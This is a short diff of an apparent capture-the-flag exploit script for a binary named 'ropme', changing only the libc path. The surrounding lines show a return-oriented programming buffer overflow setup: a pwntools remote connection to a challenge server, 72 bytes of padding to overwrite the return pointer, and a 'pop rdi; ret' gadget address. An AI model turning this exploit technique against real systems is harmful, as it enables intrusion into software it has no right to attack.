@@ -368,7 +368,7 @@ HOST, PORT = '178.62.118.108', 30396
 #p = process('./ropme', stdin=PTY)
 p = remote(HOST, PORT)
 elf = ELF('./ropme')
-libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+libc = ELF('/usr/lib/libc.so.6')
 
 padding = b'A' * 72 # offset to overwrite RIP
 gadget = 0x4006d3 # pop rdi ; ret
